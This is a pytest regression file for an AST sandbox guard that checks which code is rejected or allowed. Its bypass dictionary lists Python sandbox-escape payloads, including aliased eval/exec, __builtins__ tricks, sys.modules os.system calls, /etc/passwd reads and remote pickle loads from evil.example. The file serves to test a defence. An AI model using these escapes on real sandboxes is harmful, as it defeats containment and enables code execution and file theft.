"""Regression tests for AST-guard bypasses found in the 2026-06-22 security audit.

Each `BYPASS_*` payload previously returned `scan_source(...).ok == True` and then
executed in-process. They must now all be rejected. The `LEGIT_*` payloads are
representative indicator-strategy code that must keep passing.
"""
from __future__ import annotations

import pytest

from forven.sandbox.ast_guard import scan_source


BYPASS_PAYLOADS = {
    "builtins_eval_attr": "import builtins\nbuiltins.eval('1+1')\n",
    "builtins_exec_attr": "import builtins\nbuiltins.exec('x=1')\n",
    "builtins_open_attr": "import builtins\nbuiltins.open('/etc/passwd')\n",
    "builtins_compile_attr": "import builtins\nbuiltins.compile('1', '<s>', 'eval')\n",
    "dunder_builtins_name": "__builtins__['eval']('1+1')\n",
    "dunder_builtins_attr": "__builtins__.eval('1+1')\n",
    "getattr_binop_key": "import builtins\ngetattr(builtins, 'ev' + 'al')('1+1')\n",
    "getattr_nonconst_key": "import builtins\nk = 'eval'\ngetattr(builtins, k)('1+1')\n",
    "pandas_read_pickle": "import pandas as pd\npd.read_pickle('https://evil.example/x.pkl')\n",
    "pandas_read_csv_url": "import pandas as pd\npd.read_csv('https://evil.example/x.csv')\n",
    "numpy_load_allow_pickle": "import numpy as np\nnp.load('x.npy', allow_pickle=True)\n",
    "import_sys": "import sys\nsys.modules['os'].system('id')\n",
    "import_gc": "import gc\n",
    "import_inspect": "import inspect\n",
    "import_builtins": "import builtins\n",
    "import_importlib": "import importlib\n",
    "import_joblib": "import joblib\njoblib.load('x.pkl')\n",
    "import_io_open": "import io\nio.open('/etc/passwd')\n",
    "import_codecs": "import codecs\n",
    "from_builtins_import": "from builtins import eval as e\ne('1+1')\n",
    # Alias / indirection bypasses (2026-06-22 audit): the dangerous builtin is
    # never the direct callee, so the old Call.func-only denylist missed them.
    "alias_eval": "e = eval\ne('1+1')\n",
    "alias_compile": "c = compile\nc('1', '<s>', 'eval')\n",
    "alias_exec_in_list": "f = [exec][0]\nf('x=1')\n",
    "alias_getattr": "g = getattr\ng(object(), '__class__')\n",
    "alias_open": "o = open\no('/etc/passwd')\n",
    "eval_passed_as_arg": "list(map(eval, ['1+1']))\n",
    "dunder_import_alias": "i = __import__\ni('os')\n",
    "import_operator": "import operator\n",
    "operator_attrgetter": "from operator import attrgetter\nattrgetter('__globals__')(print)\n",
}

LEGIT_PAYLOADS = {
    "pandas_numpy_indicator": (
        "import pandas as pd\n"
        "import numpy as np\n"
        "def generate_signals(df):\n"
        "    df = df.copy()\n"
        "    df['ema'] = df['close'].ewm(span=20).mean()\n"
        "    df['ret'] = np.log(df['close'] / df['close'].shift(1))\n"
        "    df['signal'] = (df['close'] > df['ema']).astype(int)\n"
        "    return df\n"
    ),
    "math_typing_dataclass": (
        "import math\n"
        "from dataclasses import dataclass\n"
        "from typing import Any\n"
        "@dataclass\n"
        "class P:\n"
        "    span: int = 14\n"
        "def f(x):\n"
        "    return math.sqrt(abs(x))\n"
    ),
    "json_loads_is_fine": "import json\nd = json.loads('{\"a\": 1}')\n",
    "to_dict_to_json_string_form": (
        "import pandas as pd\n"
        "def g(df):\n"
        "    return df.head().to_dict()\n"
    ),
    "constant_dynamic_import_pandas": "__import__('pandas')\n",
    # Direct calls with a constant, non-dunder attribute name stay legal — the
    # alias hardening must NOT regress these common idioms.
    "getattr_constant_ok": "def pick(o):\n    return getattr(o, 'close')\n",
    "setattr_constant_ok": "class S:\n    def f(self):\n        setattr(self, 'cached', 1)\n",
    "builtin_numeric_calls_ok": "def f(x):\n    return int(float(x)) + abs(x) + round(x, 2)\n",
}


@pytest.mark.parametrize("name", sorted(BYPASS_PAYLOADS))
def test_bypass_is_blocked(name: str) -> None:
    report = scan_source(BYPASS_PAYLOADS[name])
    assert not report.ok, f"payload {name!r} should be REJECTED but passed the guard"


@pytest.mark.parametrize("name", sorted(LEGIT_PAYLOADS))
def test_legit_strategy_passes(name: str) -> None:
    report = scan_source(LEGIT_PAYLOADS[name])
    assert report.ok, (
        f"legit payload {name!r} should PASS but was blocked: "
        + "; ".join(f.message for f in report.findings)
    )
